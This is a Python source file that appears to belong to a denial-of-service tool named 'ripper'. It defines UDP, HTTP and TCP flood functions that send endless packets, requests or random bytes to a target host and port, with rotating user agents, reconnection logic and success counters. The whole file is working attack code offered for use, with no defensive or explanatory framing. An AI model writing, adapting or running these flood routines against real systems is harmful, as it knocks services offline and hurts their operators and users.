import socket
import random
import urllib.request
import threading
from os import urandom as randbytes
import ripper.services
from ripper.constants import *
from ripper.context import Context, Errors, ErrorCodes
from ripper.common import get_random_string


def down_it_udp(_ctx: Context) -> None:
    """UDP flood method."""
    i = 1
    while True:
        sock = _ctx.sock_manager.get_udp_socket()
        extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
        packet = f'GET / HTTP/1.1' \
                 f'\nHost: {_ctx.host}' \
                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                 f'\n{_ctx.base_headers[0]}' \
                 f'\n\n{extra_data}'.encode('utf-8')

        try:
            sock.sendto(packet, (_ctx.host_ip, _ctx.port))
        except socket.gaierror:
            _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
        except:
            _ctx.sock_manager.close_udp_socket()
        else:
            _ctx.Statistic.packets.total_sent += 1
            _ctx.Statistic.packets.sync_packets_sent()
            _ctx.Statistic.packets.total_sent_bytes += len(packet)
            _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)

        i += 1
        if i == 100:
            i = 1
            if not _ctx.Statistic.connect.in_progress:
                threading.Thread(daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
                # ripper.services.connect_host(_ctx)


def down_it_http(_ctx: Context) -> None:
    """HTTP flood method."""
    http_headers = _ctx.headers

    while True:
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            res = urllib.request.urlopen(
                urllib.request.Request(_ctx.get_target_url(), headers=http_headers))
            _ctx.Statistic.http_stats[res.status] += 1
        except Exception as e:
            try:
                _ctx.Statistic.http_stats[e.status] += 1
            except:
                pass
            _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
            _ctx.Statistic.connect.failed += 1
        else:
            _ctx.Statistic.connect.success += 1

        _ctx.Statistic.packets.total_sent += 1


def down_it_tcp(_ctx: Context) -> None:
    """TCP flood method."""
    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024

    while True:
        try:
            sock = _ctx.sock_manager.create_tcp_socket()
            sock.connect((_ctx.host_ip, _ctx.port))
            _ctx.Statistic.connect.success += 1
            while True:
                try:
                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
                    sock.send(bytes_to_send)
                    _ctx.Statistic.packets.total_sent_bytes += bytes_to_send_len
                    _ctx.Statistic.packets.total_sent += 1
                except:
                    _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
                    _ctx.Statistic.connect.failed += 1
                    sock.close()
                    break
        except:
            _ctx.Statistic.connect.failed += 1
